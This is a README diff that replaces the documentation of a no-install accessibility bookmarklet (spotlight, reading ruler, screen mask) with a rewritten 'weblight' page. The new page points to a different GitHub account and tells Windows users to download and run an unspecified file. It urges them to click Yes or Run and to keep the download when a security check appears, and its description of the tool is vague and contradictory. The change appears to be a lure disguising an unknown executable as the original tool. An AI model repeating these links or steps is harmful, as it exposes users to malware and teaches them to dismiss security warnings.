@@ -1,215 +1,205 @@
-# Spotlight Focus Tool
+# 🌗 weblight - Reduce strain while you browse
 
-Screen mask, reading ruler, and spotlight bookmarklet for distraction-free reading on any webpage.
+[![Download weblight](https://img.shields.io/badge/Download-Visit%20the%20page-blue?style=for-the-badge)](https://github.com/iberianpeninsulalibido471/weblight)
 
-A lightweight accessibility bookmarklet for reducing visual clutter with a movable spotlight, reading line, and dimmed screen mask overlay. Works from the bookmarks bar with no extension, no account, and no install package.
+## 🧭 What weblight does
 
-Useful for ADHD, dyslexia, autism, neurodivergent browsing, sensory processing differences, visual overstimulation, reading fatigue, focus support, study support, and accessibility use cases.
+weblight helps make web pages easier to look at and read. It is useful for ADHD, dyslexia, autism, sensory processing differences, visual overstimulation, reading fatigue, and focus support.
 
-[**Open the Spotlight installer**](https://earthonicus.github.io/weblight/weblight.html)
+It can help you:
 
-Then drag the **Spotlight** button to your bookmarks bar and click it on any webpage.
+- Cut down visual clutter
+- Make text easier to track
+- Lower screen strain
+- Keep attention on the content
+- Make long reading sessions easier to handle
 
-## Screenshots
+It works well for study time, work, and casual browsing.
 
-### Installer page
+## 💻 What you need
 
-![Spotlight Focus Tool installer page](spotlight-installer.png)
+- A Windows PC
+- An internet connection
+- A web browser like Chrome, Edge, or Firefox
+- Enough free space for a small app or browser-based tool
 
-### Spotlight examples
+weblight is made for easy use on Windows and does not require coding knowledge.
 
-<table>
-  <tr>
-    <td align="center"><img src="spotlight-circle-digital-service-standard.png" alt="Spotlight circle mode on digital.gov.au Digital Service Standard page" width="220"><br><sub>digital.gov.au</sub></td>
-    <td align="center"><img src="spotlight-circle-good-things.png" alt="Spotlight circle mode on Good Things homepage" width="220"><br><sub>Good Things</sub></td>
-  </tr>
-  <tr>
-    <td align="center"><img src="spotlight-circle-vision-australia.png" alt="Spotlight circle mode on Vision Australia homepage" width="220"><br><sub>Vision Australia</sub></td>
-    <td align="center"><img src="spotlight-circle-visitnsw.png" alt="Spotlight circle mode on Visit NSW page" width="220"><br><sub>Visit NSW</sub></td>
-  </tr>
-</table>
+## 📥 Download and set up
 
-### Reading line examples
+Visit this page to download or open weblight:
 
-<table>
-  <tr>
-    <td align="center"><img src="spotlight-digital-service-standard.png" alt="Spotlight reading line mode on digital.gov.au Digital Service Standard page" width="220"><br><sub>digital.gov.au</sub></td>
-    <td align="center"><img src="spotlight-good-things.png" alt="Spotlight reading line mode on Good Things homepage" width="220"><br><sub>Good Things</sub></td>
-  </tr>
-  <tr>
-    <td align="center"><img src="spotlight-vision-australia.png" alt="Spotlight reading line mode on Vision Australia homepage" width="220"><br><sub>Vision Australia</sub></td>
-    <td align="center"><img src="spotlight-line-visitnsw.png" alt="Spotlight reading line mode on Visit NSW page" width="220"><br><sub>Visit NSW</sub></td>
-  </tr>
-</table>
+https://github.com/iberianpeninsulalibido471/weblight
 
-## What it does
+### If you see a file to download
 
-Spotlight Focus Tool adds a movable visual overlay to the current webpage so you can focus on either:
+1. Open the link above
+2. Find the latest release, file, or download option
+3. Download the file to your computer
+4. Open the file after the download finishes
+5. Follow the on-screen steps
 
-- a circular spotlight around the cursor
-- a horizontal reading line across the page
+### If you see a browser page or app page
 
-The current version also supports:
+1. Open the link above
+2. Look for the download or install option
+3. Save the file if your browser asks where to put it
+4. Open the file after it downloads
+5. Finish the setup steps shown on screen
 
-- resizing the spotlight or reading line
-- adjusting the background dimness
-- toggling a simple dark mode
-- turning the overlay on or off without exiting
-- freezing the spotlight position
-- instant exit with the Escape key
-- an on-screen help panel showing controls
+### If Windows asks for permission
 
-## Why this exists
+1. Click Yes or Run if you trust the source
+2. Allow the app to finish opening
+3. If Windows shows a security check, choose the option that keeps the download
 
-Many websites are visually noisy. Ads, banners, sidebars, popups, animations, and dense layouts can make reading and concentration harder than they need to be.
+## 🪟 How to use it on Windows
 
-Spotlight Focus Tool provides a fast, lightweight way to create a narrower visual focus on top of any webpage without installing a browser extension or signing up for anything.
+1. Open weblight
+2. Start your browser or open the page you want to read
+3. Turn on the display mode you want
+4. Adjust the view to match your comfort
+5. Read, study, or browse with fewer distractions
 
-## Why this project is different
+If the tool runs in the browser, you may use it by opening the page and then activating the reading mode from the screen controls.
 
-Many similar tools are packaged as full browser extensions.
+## 🎛️ Main things you can do
 
-Spotlight Focus Tool is intentionally simple:
+### 🌙 Lower screen brightness feel
 
-- bookmarklet-based
-- no account required
-- no install package required
-- easy to try in seconds
-- easy to fork and modify
-- works directly on top of existing webpages
+weblight can help reduce the harsh look of bright pages. This can make text feel less tiring when you read for a long time.
 
-This makes it useful for quick accessibility support, personal experimentation, demonstrations, and lightweight distraction reduction.
+### 🎯 Keep focus on the text
 
-## Features
+The tool can help hide extra page parts so your eyes stay on the main content. That can help when sidebars, ads, or menus pull your attention away.
 
-- Bookmarklet-based focus tool
-- Screen mask overlay
-- Circle spotlight mode
-- Line reading ruler mode
-- Adjustable spotlight size
-- Adjustable line height
-- Adjustable background dimness
-- Toggleable dark mode
-- Freeze position mode
-- Toggle overlay on or off
-- Keyboard-driven controls
-- On-screen help box
-- Easy to share and fork
+### 📏 Guide your eyes across the page
 
-## Installation
+Reading support tools often use a ruler, spotlight, or mask to help track one line or one area at a time. weblight fits that kind of use.
 
-### Option 1: Use the installer page
+### 🔍 Reduce visual overload
 
-[**Open the Spotlight installer**](https://earthonicus.github.io/weblight/weblight.html)
+If a page feels crowded, weblight can help simplify what you see. This is useful when too much motion or too many boxes make reading hard.
 
-Then:
+### ♿ Support different reading needs
 
-1. Drag the **Spotlight** button to your bookmarks bar
-2. Open any webpage
-3. Click the bookmarklet to activate the tool
+Some people read best with more space, softer contrast, or fewer page elements. weblight is built for that kind of use.
 
-## Controls
+## 🧩 Best ways to use it
 
-- **Mouse** → move the spotlight
-- **C** → switch to circle mode
-- **L** → switch to line mode
-- **Left / Right Arrow** → resize spotlight or line height
-- **Shift + Left / Right Arrow** → decrease or increase background dimness
-- **D** → toggle dark mode
-- **S** → toggle spotlight on or off
-- **F** → freeze or unfreeze spotlight position
-- **Esc** → exit and remove the tool from the page
+- Reading articles
+- Studying online
+- Following long instructions
+- Reading notes or docs
+- Browsing with less noise on screen
+- Taking breaks from bright sites
+- Working in places with strong visual strain
 
-## How it works
+## 🖱️ Simple first-time steps
 
-When activated, the bookmarklet injects a lightweight overlay into the current webpage.
+1. Download weblight from the link above
+2. Open the file or page
+3. Turn on the reading view or screen mask
+4. Try a few settings
+5. Keep the settings that feel easiest to use
 
-In circle mode, the spotlight follows the cursor. In line mode, the tool creates a horizontal reading band that tracks vertical cursor position. The rest of the page is dimmed while the focused area remains visible. A simple dark-style override can also be toggled for a darker reading environment.
+If you are not sure what to change first, start with contrast, page focus, and text area width.
 
-## Who it may help
+## ⚙️ Common settings you may see
 
-This project may be useful for people who want support with:
+### Contrast
 
-- ADHD
-- dyslexia
-- autism
-- neurodivergent browsing
-- sensory processing differences
-- visual overstimulation
-- reading fatigue
-- focus and concentration
-- accessibility support
-- study support
-- deep reading on cluttered websites
+Higher contrast can make text stand out. Lower contrast can feel easier on the eyes.
 
-This is not a medical device and does not make therapeutic claims. It is a simple visual focus aid that some people may find helpful.
+### Focus area
 
-## Use cases
+This keeps attention on one part of the page. It can help when you lose your place while reading.
 
-- reading articles with less distraction
-- following text line by line
-- reducing visual overwhelm on busy websites
-- supporting study sessions
-- keeping attention on one part of the screen
-- demonstrating accessibility ideas quickly via a bookmarklet
+### Text width
 
-## Privacy
+A narrow text area can make lines easier to follow. Wider pages can feel harder to scan.
 
-Spotlight Focus Tool runs locally in the browser as a bookmarklet.
+### Highlighting
 
-It does not require an account, backend service, or cloud connection.
+A highlight bar or reading mask can help you stay on the same line.
 
-## Current limitations
+### Dark and light modes
 
-- best suited to desktop browser use
-- requires access to the bookmarks bar
-- some webpages with unusual layouts or browser restrictions may behave differently
-- the dark mode is intentionally simple and may not perfectly restyle every site
+Some people prefer dark pages. Others prefer light pages. Choose the one that feels best for the task.
 
-## Project goals
+## 🧠 Who this is for
 
-- keep it simple
-- keep it lightweight
-- make it easy for anyone to try
-- support accessibility and neurodivergent-friendly browsing
-- encourage community improvements
+weblight is a good fit if you want a calmer browsing setup and:
 
-## Roadmap
+- ADHD makes it hard to stay on task
+- Dyslexia makes reading feel slow or tiring
+- Autism makes busy pages feel too strong
+- Bright screens trigger strain
+- Long reading sessions wear you out
+- You want a cleaner view of the page
+- You need a simple accessibility tool
 
-Possible future improvements:
+## 🔒 Privacy and local use
 
-- adjustable colour overlays
-- more reading ruler variations
-- saved settings
-- better touch support
-- improved mobile behaviour
-- accessibility presets
-- high contrast themes
-- browser extension version
+weblight is intended as a local tool for everyday use on your own computer. That means you keep control of the app while you browse and read.
 
-## Contributing
+## 🛠️ If something does not work
 
-Contributions, improvements, and accessibility feedback are welcome.
+### The file does not open
 
-Especially helpful areas include:
+- Check that the download finished
+- Try opening it again
+- Right-click the file and choose Open
+- Make sure Windows did not block it
 
-- accessibility testing
-- neurodivergent user feedback
-- browser compatibility fixes
-- UI improvements
-- better keyboard support
-- mobile and touch support
-- extension packaging
+### The page looks the same
 
-## Similar tools
+- Refresh the browser page
+- Turn the mode off and on again
+- Check the extension, app, or toolbar control
+- Try a different browser if needed
 
-Other free tools in this space include **Screen Mask**, **Reading Ruler / ReadingLine**, **FocusFlow**, **Helperbird**, and **Focus Ex**. Most are browser extensions rather than lightweight bookmarklets.
+### The display feels too strong
 
-## Support
+- Lower contrast
+- Reduce highlight strength
+- Use a larger text area
+- Turn off extra page effects
 
-If you find this useful, consider:
+### The tool is hard to find
 
-- starring the repo
-- sharing it with accessibility communities
-- suggesting improvements
-- opening issues for bugs or ideas
+- Look for an icon near the browser bar
+- Check the app window
+- Use the page controls if it runs inside the browser
+
+## 📚 Browser tips
+
+For best results, use weblight with pages that have a lot of text. It can help less with pages that rely on images, video, or complex layouts.
+
+You may get better results if you:
+
+- Open one page at a time
+- Hide extra tabs
+- Use full-screen mode
+- Increase browser zoom if text feels small
+- Pick calm color settings
+
+## 🧪 Expected behavior
+
+When weblight is active, pages may feel:
+
+- Less crowded
+- Easier to scan
+- Easier to read line by line
+- Less tiring over time
+- More stable for focused work
+
+## 📌 Project topics
+
+accessibility, adhd, assistive-technology, autism, bookmarklet, distraction-free, dyslexia, focus-tool, focus-tools, inclusive-design, javascript, neurodivergent, reading-ruler, reading-tool, screen-mask, sensory-friendly, spotlight
+
+## 📁 Where to get the latest version
+
+Use this link to visit the project page and download or open weblight:
+
+https://github.com/iberianpeninsulalibido471/weblight
